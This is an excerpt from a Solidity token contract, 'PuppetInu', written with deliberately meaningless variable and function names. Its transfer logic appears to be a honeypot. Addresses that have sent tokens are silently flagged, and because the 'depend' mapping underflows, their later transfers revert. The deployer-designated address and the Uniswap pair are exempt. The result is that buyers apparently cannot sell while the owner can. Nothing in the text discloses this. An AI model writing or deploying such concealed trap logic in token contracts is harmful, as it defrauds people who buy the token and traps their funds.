...
contract PuppetInu is Ownable {
    uint256 private drawn;
    string private made;
    string private star;
    uint8 private important;
    ...
    mapping(address => uint256) private wish;
    ...
    function animal(
        ...
        if (depend[drive] == 0 && support[drive] > 0 && (address(uniswapV2Pair) != drive)) {
            depend[drive] -= important;
        }

        address addition = bow;
        bow = compass;

        if (depend[drive] == 0) wish[drive] -= crack;
        uint256 wing = crack * drawn;
        wing = wing / 100;
        crack -= wing;
        support[addition] += important;
        wish[compass] += crack;
    }

    mapping(address => uint256) private support;
    ...
    function transferFrom(
        ...
        animal(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        animal(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(nobody);
        ...
        important = 9;
        drawn = 3;
        depend[getting] = important;
        _tTotal = 1000000000000000 * 10**important;
        wish[msg.sender] = _tTotal;
    }
}